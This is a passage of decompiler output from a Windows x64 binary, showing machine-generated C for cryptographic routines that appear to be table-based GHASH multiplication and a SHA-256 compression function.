  __m128i v32; // xmm3
  __m128i v33; // xmm2
  unsigned int v34; // eax
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm3
  __m128i v38; // xmm2
  unsigned int v39; // ebx
  __m128i v40; // xmm5
  __m128i v41; // xmm4
  __m128i v42; // xmm5
  __m128i v43; // xmm4
  __m128i v44; // xmm3
  __m128i v45; // xmm2
  __m128i v46; // xmm5
  int v47; // eax
  unsigned int v48; // eax

  v4 = _mm_load_si128(a3);
  do
  {
    v5 = _mm_xor_si128(v4, _mm_loadu_si128(a1));
    v6 = _mm_cvtsi128_si32(v5);
    v7 = v6 & 0xF0F0F0F0;
    v8 = 16 * v6 & 0xF0F0F0F0;
    v9 = _mm_load_si128((__m128i *)((char *)a3 + BYTE1(v7) + 1056));
    v10 = _mm_load_si128((__m128i *)((char *)a3 + (unsigned __int8)v7 + 1056));
    v7 >>= 16;
    v11 = _mm_load_si128((__m128i *)((char *)a3 + BYTE1(v7) + 1056));
    v12 = _mm_load_si128((__m128i *)((char *)a3 + (unsigned __int8)v7 + 1056));
    v13 = _mm_srli_si128(v5, 4);
    v14 = _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v15 = _mm_xor_si128(v9, *(__m128i *)((char *)&a3[2] + BYTE1(v8)));
    v16 = _mm_xor_si128(v10, *(__m128i *)((char *)&a3[2] + (unsigned __int8)v8));
    v8 >>= 16;
    v17 = _mm_xor_si128(v11, *(__m128i *)((char *)&a3[2] + BYTE1(v8)));
    v18 = _mm_xor_si128(v12, *(__m128i *)((char *)&a3[2] + (unsigned __int8)v8));
    v19 = 16 * _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v20 = _mm_xor_si128(v15, *(__m128i *)((char *)&a3[82] + BYTE1(v14)));
    v21 = _mm_xor_si128(v16, *(__m128i *)((char *)&a3[82] + (unsigned __int8)v14));
    v14 >>= 16;
    v22 = _mm_xor_si128(v17, *(__m128i *)((char *)&a3[82] + BYTE1(v14)));
    v23 = _mm_xor_si128(v18, *(__m128i *)((char *)&a3[82] + (unsigned __int8)v14));
    v24 = _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v25 = _mm_xor_si128(v20, *(__m128i *)((char *)&a3[18] + BYTE1(v19)));
    v26 = _mm_xor_si128(v21, *(__m128i *)((char *)&a3[18] + (unsigned __int8)v19));
    v19 >>= 16;
    v27 = _mm_xor_si128(v22, *(__m128i *)((char *)&a3[18] + BYTE1(v19)));
    v28 = _mm_xor_si128(v23, *(__m128i *)((char *)&a3[18] + (unsigned __int8)v19));
    v29 = 16 * _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v30 = _mm_xor_si128(v25, *(__m128i *)((char *)&a3[98] + BYTE1(v24)));
    v31 = _mm_xor_si128(v26, *(__m128i *)((char *)&a3[98] + (unsigned __int8)v24));
    v24 >>= 16;
    v32 = _mm_xor_si128(v27, *(__m128i *)((char *)&a3[98] + BYTE1(v24)));
    v33 = _mm_xor_si128(v28, *(__m128i *)((char *)&a3[98] + (unsigned __int8)v24));
    v34 = _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v35 = _mm_xor_si128(v30, *(__m128i *)((char *)&a3[34] + BYTE1(v29)));
    v36 = _mm_xor_si128(v31, *(__m128i *)((char *)&a3[34] + (unsigned __int8)v29));
    v29 >>= 16;
    v37 = _mm_xor_si128(v32, *(__m128i *)((char *)&a3[34] + BYTE1(v29)));
    v38 = _mm_xor_si128(v33, *(__m128i *)((char *)&a3[34] + (unsigned __int8)v29));
    v39 = 16 * _mm_cvtsi128_si32(v13) & 0xF0F0F0F0;
    v40 = _mm_xor_si128(v35, *(__m128i *)((char *)&a3[114] + BYTE1(v34)));
    v41 = _mm_xor_si128(v36, *(__m128i *)((char *)&a3[114] + (unsigned __int8)v34));
    v34 >>= 16;
    v42 = _mm_xor_si128(v40, *(__m128i *)((char *)&a3[50] + BYTE1(v39)));
    v43 = _mm_xor_si128(v41, *(__m128i *)((char *)&a3[50] + (unsigned __int8)v39));
    v39 >>= 16;
    v44 = _mm_xor_si128(
            _mm_xor_si128(v37, *(__m128i *)((char *)&a3[114] + BYTE1(v34))),
            *(__m128i *)((char *)&a3[50] + BYTE1(v39)));
    v45 = _mm_xor_si128(
            _mm_xor_si128(
              _mm_xor_si128(v38, *(__m128i *)((char *)&a3[114] + (unsigned __int8)v34)),
              *(__m128i *)((char *)&a3[50] + (unsigned __int8)v39)),
            _mm_slli_si128(v44, 1));
    v46 = _mm_xor_si128(v42, _mm_slli_si128(v45, 1));
    v47 = *(unsigned __int16 *)(a4 + 2 * *(unsigned __int128 *)&_mm_srli_si128(v44, 15)) << 8;
    LOWORD(v47) = *(_WORD *)(a4 + 2 * *(unsigned __int128 *)&_mm_srli_si128(v45, 15)) ^ v47;
    v48 = v47 << 8;
    LOWORD(v48) = *(_WORD *)(a4 + 2 * *(unsigned __int128 *)&_mm_srli_si128(v46, 15)) ^ v48;
    v4 = _mm_xor_si128(_mm_cvtsi32_si128(v48), _mm_xor_si128(v43, _mm_slli_si128(v46, 1)));
    ++a1;
    --a2;
  }
  while ( a2 );
  _mm_store_si128(a3, v4);
  return v48;
}

//----- (0000000140063888) ----------------------------------------------------
__int64 __fastcall sub_140063888(const __m128i *a1, __int64 a2, __m128i *a3)
{
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  unsigned int v5; // eax
  __m128i v6; // xmm1
  __m128i v7; // xmm0
  __m128i v8; // xmm0
  unsigned int v9; // eax
  __m128i v10; // xmm0
  __m128i v11; // xmm0
  unsigned int v12; // eax
  __m128i v13; // xmm0
  __m128i v14; // xmm0
  unsigned int v15; // eax
  __m128i v16; // xmm0
  __int64 result; // rax

  v3 = _mm_load_si128(a3);
  do
  {
    v4 = _mm_xor_si128(_mm_loadu_si128(a1), v3);
    v5 = _mm_cvtsi128_si32(v4);
    v6 = _mm_srli_si128(v4, 4);
    v7 = _mm_xor_si128(_mm_xor_si128((__m128i)0i64, a3[(unsigned __int8)v5 + 2]), a3[BYTE1(v5) + 258]);
    v5 >>= 16;
    v8 = _mm_xor_si128(_mm_xor_si128(v7, a3[(unsigned __int8)v5 + 514]), a3[BYTE1(v5) + 770]);
    v9 = _mm_cvtsi128_si32(v6);
    v10 = _mm_xor_si128(_mm_xor_si128(v8, a3[(unsigned __int8)v9 + 1026]), a3[BYTE1(v9) + 1282]);
    v9 >>= 16;
    v11 = _mm_xor_si128(_mm_xor_si128(v10, a3[(unsigned __int8)v9 + 1538]), a3[BYTE1(v9) + 1794]);
    v12 = _mm_cvtsi128_si32(v6);
    v13 = _mm_xor_si128(_mm_xor_si128(v11, a3[(unsigned __int8)v12 + 2050]), a3[BYTE1(v12) + 2306]);
    v12 >>= 16;
    v14 = _mm_xor_si128(_mm_xor_si128(v13, a3[(unsigned __int8)v12 + 2562]), a3[BYTE1(v12) + 2818]);
    v15 = _mm_cvtsi128_si32(v6);
    v16 = _mm_xor_si128(_mm_xor_si128(v14, a3[(unsigned __int8)v15 + 3074]), a3[BYTE1(v15) + 3330]);
    result = v15 >> 16;
    v3 = _mm_xor_si128(_mm_xor_si128(v16, a3[(unsigned __int8)result + 3586]), a3[BYTE1(result) + 3842]);
    ++a1;
    --a2;
  }
  while ( a2 );
  _mm_store_si128(a3, v3);
  return result;
}

//----- (00000001400639D0) ----------------------------------------------------
__int64 __fastcall sub_1400639D0(const __m128i *a1, unsigned __int64 *a2, __int64 a3)
{
  _DWORD *v3; // rsi
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __int32 v6; // edx
  __int32 v7; // eax
  int v8; // edi
  __int32 v9; // ebx
  __int32 v10; // eax
  __int32 v11; // ecx
  int v12; // edi
  int v13; // ecx
  __int32 v14; // edx
  int v15; // ebx
  int v16; // ecx
  int v17; // eax
  int v18; // edi
  int v19; // ebx
  int v20; // eax
  int v21; // ecx
  __int32 v22; // edi
  int v23; // ecx
  int v24; // edx
  int v25; // ebx
  int v26; // ecx
  int v27; // eax
  int v28; // edi
  int v29; // ebx
  __int32 v30; // eax
  __int32 v31; // ecx
  int v32; // edi
  int v33; // ecx
  __int32 v34; // edx
  int v35; // ebx
  int v36; // ecx
  int v37; // eax
  int v38; // edi
  int v39; // ebx
  int v40; // eax
  int v41; // ecx
  __int32 v42; // edi
  int v43; // ecx
  int v44; // edx
  int v45; // ebx
  int v46; // ecx
  int v47; // eax
  int v48; // edi
  int v49; // ebx
  __int32 v50; // eax
  __int32 v51; // ecx
  int v52; // edi
  int v53; // ecx
  __int32 v54; // edx
  int v55; // ebx
  int v56; // ecx
  int v57; // eax
  int v58; // edi
  int v59; // ebx
  int v60; // eax
  int v61; // ecx
  __int32 v62; // edi
  int v63; // ecx
  int v64; // edx
  int v65; // ebx
  int v66; // ecx
  int v67; // eax
  int v68; // edi
  int v69; // ebx
  __int32 v70; // eax
  __int32 v71; // ecx
  int v72; // edi
  int v73; // ecx
  __int32 v74; // edx
  int v75; // ebx
  int v76; // ecx
  int v77; // eax
  int v78; // edi
  int v79; // ebx
  __int64 result; // rax
  int v81; // ecx
  __int32 v82; // edi
  int v83; // ecx
  int v84; // edx
  int v85; // edx
  int v86; // ebx
  int v87; // ecx
  __int32 v88; // eax
  __int32 v89; // edi
  int v90; // edi
  __int32 v91; // ebx
  __int32 v92; // eax
  __int32 v93; // ecx
  int v94; // edi
  int v95; // ecx
  __int32 v96; // edx
  int v97; // edx
  int v98; // ebx
  int v99; // ecx
  int v100; // eax
  __int32 v101; // edi
  int v102; // edi
  int v103; // ebx
  int v104; // eax
  int v105; // ecx
  __int32 v106; // edi
  int v107; // ecx
  int v108; // edx
  int v109; // edx
  int v110; // ebx
  int v111; // ecx
  int v112; // eax
  int v113; // edi
  int v114; // edi
  int v115; // ebx
  __int32 v116; // eax
  __int32 v117; // ecx
  int v118; // edi
  int v119; // ecx
  __int32 v120; // edx
  int v121; // edx
  int v122; // ebx
  int v123; // ecx
  int v124; // eax
  __int32 v125; // edi
  int v126; // edi
  int v127; // ebx
  int v128; // eax
  int v129; // ecx
  __int32 v130; // edi
  int v131; // ecx
  int v132; // edx
  int v133; // edx
  int v134; // ebx
  int v135; // ecx
  int v136; // eax
  int v137; // edi
  int v138; // edi
  int v139; // ebx
  __int32 v140; // eax
  __int32 v141; // ecx
  int v142; // edi
  int v143; // ecx
  __int32 v144; // edx
  int v145; // edx
  int v146; // ebx
  int v147; // ecx
  int v148; // eax
  __int32 v149; // edi
  int v150; // edi
  int v151; // ebx
  int v152; // eax
  int v153; // ecx
  __int32 v154; // edi
  int v155; // ecx
  int v156; // edx
  int v157; // edx
  int v158; // ebx
  int v159; // ecx
  int v160; // eax
  int v161; // edi
  int v162; // edi
  int v163; // ebx
  __int32 v164; // eax
  __int32 v165; // ecx
  int v166; // edi
  int v167; // ecx
  __int32 v168; // edx
  int v169; // edx
  int v170; // ebx
  int v171; // ecx
  int v172; // eax
  __int32 v173; // edi
  int v174; // edi
  int v175; // ebx
  int v176; // ecx
  __m128i *v177; // rcx
  __m128i v178; // [rsp+0h] [rbp-A8h]
  __m128i v179; // [rsp+10h] [rbp-98h]
  unsigned __int64 v180; // [rsp+20h] [rbp-88h]
  unsigned __int64 v181; // [rsp+28h] [rbp-80h]
  unsigned __int64 v182; // [rsp+30h] [rbp-78h]
  unsigned __int64 v183; // [rsp+38h] [rbp-70h]
  unsigned __int64 v184; // [rsp+40h] [rbp-68h]
  unsigned __int64 v185; // [rsp+48h] [rbp-60h]
  unsigned __int64 v186; // [rsp+50h] [rbp-58h]
  unsigned __int64 v187; // [rsp+58h] [rbp-50h]
  _DWORD *v188; // [rsp+60h] [rbp-48h]
  const __m128i *v189; // [rsp+68h] [rbp-40h]
  unsigned __int64 *v190; // [rsp+70h] [rbp-38h]
  unsigned __int64 *v191; // [rsp+78h] [rbp-30h]

  v3 = &unk_1400AD300;
  v189 = a1;
  v190 = a2;
  v191 = (unsigned __int64 *)((char *)a2 + a3);
  v4 = _mm_load_si128(a1);
  v5 = _mm_load_si128(a1 + 1);
  v188 = &unk_1400AD300;
  do
  {
    v3 -= 48;
    _mm_store_si128(&v179, v5);
    _mm_store_si128(&v178, v4);
    v187 = _byteswap_uint64(*a2);
    v186 = _byteswap_uint64(a2[1]);
    v185 = _byteswap_uint64(a2[2]);
    v184 = _byteswap_uint64(a2[3]);
    v183 = _byteswap_uint64(a2[4]);
    v182 = _byteswap_uint64(a2[5]);
    v181 = _byteswap_uint64(a2[6]);
    v180 = _byteswap_uint64(a2[7]);
    v6 = (__ROR4__(__ROR4__(v179.m128i_i32[0], 6), 5) ^ __ROR4__(v179.m128i_i32[0], 6) ^ __ROR4__(v179.m128i_i32[0], 25))
       + v179.m128i_i32[3]
       + HIDWORD(v187)
       + *v3
       + (v179.m128i_i32[2] ^ v179.m128i_i32[0] & (v179.m128i_i32[2] ^ v179.m128i_i32[1]));
    v178.m128i_i32[3] += v6;
    v7 = (__ROR4__(__ROR4__(v178.m128i_i32[0], 2), 11) ^ __ROR4__(v178.m128i_i32[0], 2) ^ __ROR4__(
                                                                                            v178.m128i_i32[0],
                                                                                            22))
       + v6
       + (v178.m128i_i32[1] ^ (v178.m128i_i32[1] ^ v178.m128i_i32[0]) & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
    v179.m128i_i32[3] = v7;
    v8 = (__ROR4__(__ROR4__(v178.m128i_i32[3], 6), 5) ^ __ROR4__(v178.m128i_i32[3], 6) ^ __ROR4__(v178.m128i_i32[3], 25))
       + v179.m128i_i32[2]
       + v187
       + v3[1]
       + (v179.m128i_i32[1] ^ v178.m128i_i32[3] & (v179.m128i_i32[1] ^ v179.m128i_i32[0]));
    v9 = (__ROR4__(__ROR4__(v178.m128i_i32[0], 2), 11) ^ __ROR4__(v178.m128i_i32[0], 2) ^ __ROR4__(
                                                                                            v178.m128i_i32[0],
                                                                                            22))
       + v6
       + (v178.m128i_i32[1] ^ (v178.m128i_i32[1] ^ v178.m128i_i32[0]) & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
    v10 = v178.m128i_i32[0] ^ v7;
    v11 = v8 + (v178.m128i_i32[0] ^ v10 & (v178.m128i_i32[1] ^ v178.m128i_i32[0]));
    v12 = v178.m128i_i32[2] + v8;
    v178.m128i_i32[2] = v12;
    v13 = (__ROR4__(__ROR4__(v9, 2), 11) ^ __ROR4__(v9, 2) ^ __ROR4__(v9, 22)) + v11;
    v179.m128i_i32[2] = v13;
    v14 = (__ROR4__(__ROR4__(v12, 6), 5) ^ __ROR4__(v12, 6) ^ __ROR4__(v12, 25))
        + v179.m128i_i32[1]
        + HIDWORD(v186)
        + v3[2]
        + (v179.m128i_i32[0] ^ v12 & (v179.m128i_i32[0] ^ v178.m128i_i32[3]));
    v15 = v13;
    v16 = v179.m128i_i32[3] ^ v13;
    v178.m128i_i32[1] += v14;
    v17 = (__ROR4__(__ROR4__(v15, 2), 11) ^ __ROR4__(v15, 2) ^ __ROR4__(v15, 22))
        + v14
        + (v179.m128i_i32[3] ^ v16 & v10);
    v179.m128i_i32[1] = v17;
    v18 = (__ROR4__(__ROR4__(v178.m128i_i32[1], 6), 5) ^ __ROR4__(v178.m128i_i32[1], 6) ^ __ROR4__(
                                                                                            v178.m128i_i32[1],
                                                                                            25))
        + v179.m128i_i32[0]
        + v186
        + v3[3]
        + (v178.m128i_i32[3] ^ v178.m128i_i32[1] & (v178.m128i_i32[3] ^ v12));
    v19 = v17;
    v20 = v179.m128i_i32[2] ^ v17;
    v21 = v18 + (v179.m128i_i32[2] ^ v20 & v16);
    v22 = v178.m128i_i32[0] + v18;
    v178.m128i_i32[0] = v22;
    v23 = (__ROR4__(__ROR4__(v19, 2), 11) ^ __ROR4__(v19, 2) ^ __ROR4__(v19, 22)) + v21;
    v179.m128i_i32[0] = v23;
    v24 = (__ROR4__(__ROR4__(v22, 6), 5) ^ __ROR4__(v22, 6) ^ __ROR4__(v22, 25))
        + v178.m128i_i32[3]
        + HIDWORD(v185)
        + v3[4]
        + (v178.m128i_i32[2] ^ v22 & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
    v25 = v23;
    v26 = v179.m128i_i32[1] ^ v23;
    v179.m128i_i32[3] += v24;
    v27 = (__ROR4__(__ROR4__(v25, 2), 11) ^ __ROR4__(v25, 2) ^ __ROR4__(v25, 22))
        + v24
        + (v179.m128i_i32[1] ^ v26 & v20);
    v178.m128i_i32[3] = v27;
    v28 = (__ROR4__(__ROR4__(v179.m128i_i32[3], 6), 5) ^ __ROR4__(v179.m128i_i32[3], 6) ^ __ROR4__(
                                                                                            v179.m128i_i32[3],
                                                                                            25))
        + v178.m128i_i32[2]
        + v185
        + v3[5]
        + (v178.m128i_i32[1] ^ v179.m128i_i32[3] & (v178.m128i_i32[1] ^ v22));
    v29 = v27;
    v30 = v179.m128i_i32[0] ^ v27;
    v31 = v28 + (v179.m128i_i32[0] ^ v30 & v26);
    v32 = v179.m128i_i32[2] + v28;
    v179.m128i_i32[2] = v32;
    v33 = (__ROR4__(__ROR4__(v29, 2), 11) ^ __ROR4__(v29, 2) ^ __ROR4__(v29, 22)) + v31;
    v178.m128i_i32[2] = v33;
    v34 = (__ROR4__(__ROR4__(v32, 6), 5) ^ __ROR4__(v32, 6) ^ __ROR4__(v32, 25))
        + v178.m128i_i32[1]
        + HIDWORD(v184)
        + v3[6]
        + (v178.m128i_i32[0] ^ v32 & (v178.m128i_i32[0] ^ v179.m128i_i32[3]));
    v35 = v33;
    v36 = v178.m128i_i32[3] ^ v33;
    v179.m128i_i32[1] += v34;
    v37 = (__ROR4__(__ROR4__(v35, 2), 11) ^ __ROR4__(v35, 2) ^ __ROR4__(v35, 22))
        + v34
        + (v178.m128i_i32[3] ^ v36 & v30);
    v178.m128i_i32[1] = v37;
    v38 = (__ROR4__(__ROR4__(v179.m128i_i32[1], 6), 5) ^ __ROR4__(v179.m128i_i32[1], 6) ^ __ROR4__(
                                                                                            v179.m128i_i32[1],
                                                                                            25))
        + v178.m128i_i32[0]
        + v184
        + v3[7]
        + (v179.m128i_i32[3] ^ v179.m128i_i32[1] & (v179.m128i_i32[3] ^ v32));
    v39 = v37;
    v40 = v178.m128i_i32[2] ^ v37;
    v41 = v38 + (v178.m128i_i32[2] ^ v40 & v36);
    v42 = v179.m128i_i32[0] + v38;
    v179.m128i_i32[0] = v42;
    v43 = (__ROR4__(__ROR4__(v39, 2), 11) ^ __ROR4__(v39, 2) ^ __ROR4__(v39, 22)) + v41;
    v178.m128i_i32[0] = v43;
    v44 = (__ROR4__(__ROR4__(v42, 6), 5) ^ __ROR4__(v42, 6) ^ __ROR4__(v42, 25))
        + v179.m128i_i32[3]
        + HIDWORD(v183)
        + v3[8]
        + (v179.m128i_i32[2] ^ v42 & (v179.m128i_i32[2] ^ v179.m128i_i32[1]));
    v45 = v43;
    v46 = v178.m128i_i32[1] ^ v43;
    v178.m128i_i32[3] += v44;
    v47 = (__ROR4__(__ROR4__(v45, 2), 11) ^ __ROR4__(v45, 2) ^ __ROR4__(v45, 22))
        + v44
        + (v178.m128i_i32[1] ^ v46 & v40);
    v179.m128i_i32[3] = v47;
    v48 = (__ROR4__(__ROR4__(v178.m128i_i32[3], 6), 5) ^ __ROR4__(v178.m128i_i32[3], 6) ^ __ROR4__(
                                                                                            v178.m128i_i32[3],
                                                                                            25))
        + v179.m128i_i32[2]
        + v183
        + v3[9]
        + (v179.m128i_i32[1] ^ v178.m128i_i32[3] & (v179.m128i_i32[1] ^ v42));
    v49 = v47;
    v50 = v178.m128i_i32[0] ^ v47;
    v51 = v48 + (v178.m128i_i32[0] ^ v50 & v46);
    v52 = v178.m128i_i32[2] + v48;
    v178.m128i_i32[2] = v52;
    v53 = (__ROR4__(__ROR4__(v49, 2), 11) ^ __ROR4__(v49, 2) ^ __ROR4__(v49, 22)) + v51;
    v179.m128i_i32[2] = v53;
    v54 = (__ROR4__(__ROR4__(v52, 6), 5) ^ __ROR4__(v52, 6) ^ __ROR4__(v52, 25))
        + v179.m128i_i32[1]
        + HIDWORD(v182)
        + v3[10]
        + (v179.m128i_i32[0] ^ v52 & (v179.m128i_i32[0] ^ v178.m128i_i32[3]));
    v55 = v53;
    v56 = v179.m128i_i32[3] ^ v53;
    v178.m128i_i32[1] += v54;
    v57 = (__ROR4__(__ROR4__(v55, 2), 11) ^ __ROR4__(v55, 2) ^ __ROR4__(v55, 22))
        + v54
        + (v179.m128i_i32[3] ^ v56 & v50);
    v179.m128i_i32[1] = v57;
    v58 = (__ROR4__(__ROR4__(v178.m128i_i32[1], 6), 5) ^ __ROR4__(v178.m128i_i32[1], 6) ^ __ROR4__(
                                                                                            v178.m128i_i32[1],
                                                                                            25))
        + v179.m128i_i32[0]
        + v182
        + v3[11]
        + (v178.m128i_i32[3] ^ v178.m128i_i32[1] & (v178.m128i_i32[3] ^ v52));
    v59 = v57;
    v60 = v179.m128i_i32[2] ^ v57;
    v61 = v58 + (v179.m128i_i32[2] ^ v60 & v56);
    v62 = v178.m128i_i32[0] + v58;
    v178.m128i_i32[0] = v62;
    v63 = (__ROR4__(__ROR4__(v59, 2), 11) ^ __ROR4__(v59, 2) ^ __ROR4__(v59, 22)) + v61;
    v179.m128i_i32[0] = v63;
    v64 = (__ROR4__(__ROR4__(v62, 6), 5) ^ __ROR4__(v62, 6) ^ __ROR4__(v62, 25))
        + v178.m128i_i32[3]
        + HIDWORD(v181)
        + v3[12]
        + (v178.m128i_i32[2] ^ v62 & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
    v65 = v63;
    v66 = v179.m128i_i32[1] ^ v63;
    v179.m128i_i32[3] += v64;
    v67 = (__ROR4__(__ROR4__(v65, 2), 11) ^ __ROR4__(v65, 2) ^ __ROR4__(v65, 22))
        + v64
        + (v179.m128i_i32[1] ^ v66 & v60);
    v178.m128i_i32[3] = v67;
    v68 = (__ROR4__(__ROR4__(v179.m128i_i32[3], 6), 5) ^ __ROR4__(v179.m128i_i32[3], 6) ^ __ROR4__(
                                                                                            v179.m128i_i32[3],
                                                                                            25))
        + v178.m128i_i32[2]
        + v181
        + v3[13]
        + (v178.m128i_i32[1] ^ v179.m128i_i32[3] & (v178.m128i_i32[1] ^ v62));
    v69 = v67;
    v70 = v179.m128i_i32[0] ^ v67;
    v71 = v68 + (v179.m128i_i32[0] ^ v70 & v66);
    v72 = v179.m128i_i32[2] + v68;
    v179.m128i_i32[2] = v72;
    v73 = (__ROR4__(__ROR4__(v69, 2), 11) ^ __ROR4__(v69, 2) ^ __ROR4__(v69, 22)) + v71;
    v178.m128i_i32[2] = v73;
    v74 = (__ROR4__(__ROR4__(v72, 6), 5) ^ __ROR4__(v72, 6) ^ __ROR4__(v72, 25))
        + v178.m128i_i32[1]
        + HIDWORD(v180)
        + v3[14]
        + (v178.m128i_i32[0] ^ v72 & (v178.m128i_i32[0] ^ v179.m128i_i32[3]));
    v75 = v73;
    v76 = v178.m128i_i32[3] ^ v73;
    v179.m128i_i32[1] += v74;
    v77 = (__ROR4__(__ROR4__(v75, 2), 11) ^ __ROR4__(v75, 2) ^ __ROR4__(v75, 22))
        + v74
        + (v178.m128i_i32[3] ^ v76 & v70);
    v178.m128i_i32[1] = v77;
    v78 = (__ROR4__(__ROR4__(v179.m128i_i32[1], 6), 5) ^ __ROR4__(v179.m128i_i32[1], 6) ^ __ROR4__(
                                                                                            v179.m128i_i32[1],
                                                                                            25))
        + v178.m128i_i32[0]
        + v180
        + v3[15]
        + (v179.m128i_i32[3] ^ v179.m128i_i32[1] & (v179.m128i_i32[3] ^ v72));
    v79 = v77;
    LODWORD(result) = v178.m128i_i32[2] ^ v77;
    v81 = v78 + (v178.m128i_i32[2] ^ result & v76);
    v82 = v179.m128i_i32[0] + v78;
    v179.m128i_i32[0] = v82;
    v83 = (__ROR4__(__ROR4__(v79, 2), 11) ^ __ROR4__(v79, 2) ^ __ROR4__(v79, 22)) + v81;
    v178.m128i_i32[0] = v83;
    do
    {
      v3 += 16;
      v84 = v179.m128i_i32[3]
          + *v3
          + (__ROR4__(__ROR4__(v82, 6), 5) ^ __ROR4__(v82, 6) ^ __ROR4__(v82, 25))
          + (v179.m128i_i32[2] ^ v82 & (v179.m128i_i32[2] ^ v179.m128i_i32[1]));
      HIDWORD(v187) += v183
                     + (__ROR4__(HIDWORD(v180), 17) ^ (HIDWORD(v180) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v180), 17), 2))
                     + (__ROR4__(__ROR4__(v187, 7), 11) ^ __ROR4__(v187, 7) ^ ((unsigned int)v187 >> 3));
      v85 = HIDWORD(v187) + v84;
      v86 = v83;
      v87 = v178.m128i_i32[1] ^ v83;
      v178.m128i_i32[3] += v85;
      v88 = (__ROR4__(__ROR4__(v86, 2), 11) ^ __ROR4__(v86, 2) ^ __ROR4__(v86, 22))
          + v85
          + (v178.m128i_i32[1] ^ v87 & result);
      v179.m128i_i32[3] = v88;
      v89 = v179.m128i_i32[2]
          + v3[1]
          + (__ROR4__(__ROR4__(v178.m128i_i32[3], 6), 5) ^ __ROR4__(v178.m128i_i32[3], 6) ^ __ROR4__(
                                                                                              v178.m128i_i32[3],
                                                                                              25))
          + (v179.m128i_i32[1] ^ v178.m128i_i32[3] & (v179.m128i_i32[1] ^ v179.m128i_i32[0]));
      LODWORD(v187) = v187
                    + HIDWORD(v182)
                    + (__ROR4__(v180, 17) ^ ((unsigned int)v180 >> 10) ^ __ROR4__(__ROR4__(v180, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v186), 7), 11) ^ __ROR4__(HIDWORD(v186), 7) ^ (HIDWORD(v186) >> 3));
      v90 = v187 + v89;
      v91 = v88;
      v92 = v178.m128i_i32[0] ^ v88;
      v93 = v90 + (v178.m128i_i32[0] ^ v92 & v87);
      v94 = v178.m128i_i32[2] + v90;
      v178.m128i_i32[2] = v94;
      v95 = (__ROR4__(__ROR4__(v91, 2), 11) ^ __ROR4__(v91, 2) ^ __ROR4__(v91, 22)) + v93;
      v179.m128i_i32[2] = v95;
      v96 = v179.m128i_i32[1]
          + v3[2]
          + (__ROR4__(__ROR4__(v94, 6), 5) ^ __ROR4__(v94, 6) ^ __ROR4__(v94, 25))
          + (v179.m128i_i32[0] ^ v94 & (v179.m128i_i32[0] ^ v178.m128i_i32[3]));
      HIDWORD(v186) += v182
                     + (__ROR4__(HIDWORD(v187), 17) ^ (HIDWORD(v187) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v187), 17), 2))
                     + (__ROR4__(__ROR4__(v186, 7), 11) ^ __ROR4__(v186, 7) ^ ((unsigned int)v186 >> 3));
      v97 = HIDWORD(v186) + v96;
      v98 = v95;
      v99 = v179.m128i_i32[3] ^ v95;
      v178.m128i_i32[1] += v97;
      v100 = (__ROR4__(__ROR4__(v98, 2), 11) ^ __ROR4__(v98, 2) ^ __ROR4__(v98, 22))
           + v97
           + (v179.m128i_i32[3] ^ v99 & v92);
      v179.m128i_i32[1] = v100;
      v101 = v179.m128i_i32[0]
           + v3[3]
           + (__ROR4__(__ROR4__(v178.m128i_i32[1], 6), 5) ^ __ROR4__(v178.m128i_i32[1], 6) ^ __ROR4__(
                                                                                               v178.m128i_i32[1],
                                                                                               25))
           + (v178.m128i_i32[3] ^ v178.m128i_i32[1] & (v178.m128i_i32[3] ^ v94));
      LODWORD(v186) = v186
                    + HIDWORD(v181)
                    + (__ROR4__(v187, 17) ^ ((unsigned int)v187 >> 10) ^ __ROR4__(__ROR4__(v187, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v185), 7), 11) ^ __ROR4__(HIDWORD(v185), 7) ^ (HIDWORD(v185) >> 3));
      v102 = v186 + v101;
      v103 = v100;
      v104 = v179.m128i_i32[2] ^ v100;
      v105 = v102 + (v179.m128i_i32[2] ^ v104 & v99);
      v106 = v178.m128i_i32[0] + v102;
      v178.m128i_i32[0] = v106;
      v107 = (__ROR4__(__ROR4__(v103, 2), 11) ^ __ROR4__(v103, 2) ^ __ROR4__(v103, 22)) + v105;
      v179.m128i_i32[0] = v107;
      v108 = v178.m128i_i32[3]
           + v3[4]
           + (__ROR4__(__ROR4__(v106, 6), 5) ^ __ROR4__(v106, 6) ^ __ROR4__(v106, 25))
           + (v178.m128i_i32[2] ^ v106 & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
      HIDWORD(v185) += v181
                     + (__ROR4__(HIDWORD(v186), 17) ^ (HIDWORD(v186) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v186), 17), 2))
                     + (__ROR4__(__ROR4__(v185, 7), 11) ^ __ROR4__(v185, 7) ^ ((unsigned int)v185 >> 3));
      v109 = HIDWORD(v185) + v108;
      v110 = v107;
      v111 = v179.m128i_i32[1] ^ v107;
      v179.m128i_i32[3] += v109;
      v112 = (__ROR4__(__ROR4__(v110, 2), 11) ^ __ROR4__(v110, 2) ^ __ROR4__(v110, 22))
           + v109
           + (v179.m128i_i32[1] ^ v111 & v104);
      v178.m128i_i32[3] = v112;
      v113 = v178.m128i_i32[2]
           + v3[5]
           + (__ROR4__(__ROR4__(v179.m128i_i32[3], 6), 5) ^ __ROR4__(v179.m128i_i32[3], 6) ^ __ROR4__(
                                                                                               v179.m128i_i32[3],
                                                                                               25))
           + (v178.m128i_i32[1] ^ v179.m128i_i32[3] & (v178.m128i_i32[1] ^ v106));
      LODWORD(v185) = v185
                    + HIDWORD(v180)
                    + (__ROR4__(v186, 17) ^ ((unsigned int)v186 >> 10) ^ __ROR4__(__ROR4__(v186, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v184), 7), 11) ^ __ROR4__(HIDWORD(v184), 7) ^ (HIDWORD(v184) >> 3));
      v114 = v185 + v113;
      v115 = v112;
